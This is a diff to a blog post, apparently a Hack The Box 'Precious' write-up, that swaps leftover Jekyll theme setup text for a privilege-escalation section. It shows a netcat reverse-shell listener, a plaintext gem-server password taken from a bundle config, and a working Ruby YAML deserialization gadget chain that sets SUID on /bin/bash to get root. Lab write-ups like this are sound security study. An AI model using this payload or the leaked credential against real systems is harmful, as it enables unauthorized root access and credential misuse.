@@ -45,7 +45,7 @@ for convert to pdf file
 
 ---
 
-### Testing
+### Enumeration
 So with that panel we have to write our vpn from plataform and it this the results
 
 ![HTB Img](/assets/img//HTB/EASY/clueping.png){: width="800" height="300" }
@@ -125,7 +125,7 @@ connect to [10.10.14.19] from (UNKNOWN) [10.10.11.189] 49814
 ruby@precious:/var/www/pdfapp$ 
 
 ```
-So already there we have to research any information and found from bundle folder we see the config file
+So already there we have to research any information, until found from bundle folder we see the config file
 showing us the following information
 
 ```console
@@ -157,160 +157,69 @@ henry@precious:~$ cat user.txt
 ```
 And we got the first user flag ~(^o^)~
 
-Now we are going to start the privileges escalation started for research some folders or files allows
+## Privileges Escalation
 
-- [**Using the Chirpy Starter**](#option-1-using-the-chirpy-starter) - Easy to upgrade, isolates irrelevant project files so you can focus on writing.
-- [**Forking on GitHub**](#option-2-forking-on-github) - Convenient for custom development, but difficult to upgrade. Unless you are familiar with Jekyll and are determined to tweak or contribute to this project, this approach is not recommended.
-
-
-
-#### Option 2. Forking on GitHub
-
-[Fork **Chirpy**](https://github.com/cotes2020/jekyll-theme-chirpy/fork) on GitHub and rename it to `<GH_USERNAME>.github.io`. Please note that the default branch code is in development.  If you want the site to be stable, please switch to the [latest tag][latest-tag] and start writing.
-
-
-> If you don't want to deploy your site on GitHub Pages, append option `--no-gh` at the end of the above command.
-{: .prompt-info }
-
-The above command will:
-
-1. Remove the files in `_posts`{: .filepath} from your repository.
-
-2. If the option `--no-gh` is provided, the directory `.github`{: .filepath} will be deleted. Otherwise, set up the GitHub Action workflow by removing the extension `.hook`{: .filepath} of `.github/workflows/pages-deploy.yml.hook`{: .filepath}, and then remove the other files and directories in the folder `.github`{: .filepath}.
-
-3. Remove item `Gemfile.lock` from `.gitignore`{: .filepath}.
-
-4. Create a new commit to save the changes automatically.
-
-
-### Configuration
-
-Update the variables of `_config.yml`{: .filepath} as needed. Some of them are typical options:
-
-- `url`
-- `avatar`
-- `timezone`
-- `lang`
-
-### Customizing Stylesheet
-
-If you need to customize the stylesheet, copy the theme's `assets/css/style.scss`{: .filepath} to the same path on your Jekyll site, and then add the custom style at the end of it.
-
-Starting with version `4.1.0`, if you want to overwrite the SASS variables defined in `_sass/addon/variables.scss`{: .filepath}, copy the main sass file `_sass/jekyll-theme-chirpy.scss`{: .filepath} into the `_sass`{: .filepath} directory in your site's source, then create a new file `_sass/variables-hook.scss`{: .filepath} and assign new value.
-
-### Customing Static Assets
-
-Static assets configuration was introduced in version `5.1.0`. The CDN of the static assets is defined by file `_data/assets/cross_origin.yml`{: .filepath }, and you can replace some of them according to the network conditions in the region where your website is published.
-
-Also, if you'd like to self-host the static assets, please refer to the [_chirpy-static-assets_](https://github.com/cotes2020/chirpy-static-assets#readme).
-
-### Running Local Server
+Now we are going to start the privileges escalation started for research permissions throught sudoers
+Got the next result
 
 ```console
-$ ruby@precious:~/.bundle$ cat config
-cat config
+henry@precious:~$ sudo -l
+Matching Defaults entries for henry on precious:
+    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User henry may run the following commands on precious:
+    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+```
+And how we can see this user may to run this file from `/opt/update_dependencies.rb`
+
+```console
+henry@precious:~$ cat /opt/update_dependencies.rb
 ---
-BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
-
+def list_from_file
+    YAML.load(File.read("dependencies.yml"))
+end
 ```
-
-You may want to preview the site contents before publishing, so just run it by:
-
-
-so we can capture the user flag 
-
-
-
-Or run the site on Docker with the following command:
+so seeying that script has to load any file called `dependencies.yml` and researched we can used this [**script**](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)make a bash uid
 
 ```console
-$ docker run -it --rm \
-    --volume="$PWD:/srv/jekyll" \
-    -p 4000:4000 jekyll/jekyll \
-    jekyll serve
-```
-
-After a while, the local service will be published at _<http://127.0.0.1:4000>_.
-
-## Deployment
-
-Before the deployment begins, check out the file `_config.yml`{: .filepath} and make sure the `url` is configured correctly. Furthermore, if you prefer the [**project site**](https://help.github.com/en/github/working-with-github-pages/about-github-pages#types-of-github-pages-sites) and don't use a custom domain, or you want to visit your website with a base URL on a web server other than **GitHub Pages**, remember to change the `baseurl` to your project name that starts with a slash, e.g, `/project-name`.
-
-Now you can choose ONE of the following methods to deploy your Jekyll site.
-
-### Deploy by Using GitHub Actions
-
-Ensure your Jekyll site has the file `.github/workflows/pages-deploy.yml`{: .filepath}. Otherwise, create a new one and fill in the contents of the [sample file][workflow], and the value of the `on.push.branches` should be the same as your repo's default branch name. And then rename your repository to `<GH_USERNAME>.github.io` on GitHub.
-
-Furthermore, if you have committed `Gemfile.lock`{: .filepath} to the repository and your local machine is not Linux, go the the root directory of your site and update the platform list:
-
-```console
-$ bundle lock --add-platform x86_64-linux
-```
-
-Now publish your Jekyll site:
-
-1. Browse to your repository on GitHub. Select the tab _Settings_, then click _Pages_ in the left navigation bar. Then, in the **Source** section (under _Build and deployment_), select [**GitHub Actions**][pages-workflow-src] from the dropdown menu.
-
-2. Push any commit to remote to trigger the GitHub Actions workflow. In the _Actions_ tab of your repository, you should see the workflow _Build and Deploy_ running. Once the build is complete and successful, the site should be deployed automatically.
-
-3. Visit your website at the address indicated by GitHub.
-
-
-
-and Now you can see your terminal
-```console
-$ nc -lvnp 443
-listening on [any] 443 ...
-connect to [10.10.14.19] from (UNKNOWN) [10.10.11.189] 49814
-ruby@precious:/var/www/pdfapp$ 
-
-```
-
-### Manually Build and Deploy
-
-On self-hosted servers, you cannot enjoy the convenience of **GitHub Actions**. Therefore, you should build the site on your local machine and then upload the site files to the server.
-
-Go to the root of the source project, and build your site as follows:
+henry@precious:~$ cat dependencies.yml
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: chmod u+s /bin/bash
+         method_id: :resolve
+ ```
+we running the script with the yml we've created become it a `bash` to `uid` 
 
 ```console
-$ JEKYLL_ENV=production bundle exec jekyll b
-```
+henry@precious:~$ sudo ruby /opt/update_dependencies.rb 2>/dev/null
+henry@precious:~$ bash -p
+bash-5.1# whoami
+root
 
-Or build the site on Docker:
+```
+Now we can got the **root** flag (^▽^)
 
 ```console
-$ docker run -it --rm \
-    --env JEKYLL_ENV=production \
-    --volume="$PWD:/srv/jekyll" \
-    jekyll/jekyll \
-    jekyll build
+bash-5.1# cat /root/root.txt 
+G6****************
+bash-5.1#
 ```
 
-Unless you specified the output path, the generated site files will be placed in folder `_site`{: .filepath} of the project's root directory. Now you should upload those files to the target server.
-
-## Upgrading
-
-It depends on how you use the theme:
-
-- If you are using the theme gem (there will be `gem "jekyll-theme-chirpy"` in the `Gemfile`{: .filepath}), editing the `Gemfile`{: .filepath} and update the version number of the theme gem, for example:
-
-  ```diff
-  - gem "jekyll-theme-chirpy", "~> 3.2", ">= 3.2.1"
-  + gem "jekyll-theme-chirpy", "~> 3.3", ">= 3.3.0"
-  ```
-  {: .nolineno file="Gemfile" }
-
-  And then execute the following command:
-
-  ```console
-  $ bundle update jekyll-theme-chirpy
-  ```
-
-  As the version upgrades, the critical files (for details, see the [Startup Template][starter]) and configuration options will change. Please refer to the [Upgrade Guide](https://github.com/cotes2020/jekyll-theme-chirpy/wiki/Upgrade-Guide) to keep your repo's files in sync with the latest version of the theme.
-
-- If you forked from the source project (there will be `gemspec` in the `Gemfile`{: .filepath} of your site), then merge the [latest upstream tags][latest-tag] into your Jekyll site to complete the upgrade.
-The merge is likely to conflict with your local modifications. Please be patient and careful to resolve these conflicts.
 
 [starter]: https://github.com/cotes2020/chirpy-starter
 [use-starter]: https://github.com/cotes2020/chirpy-starter/generate
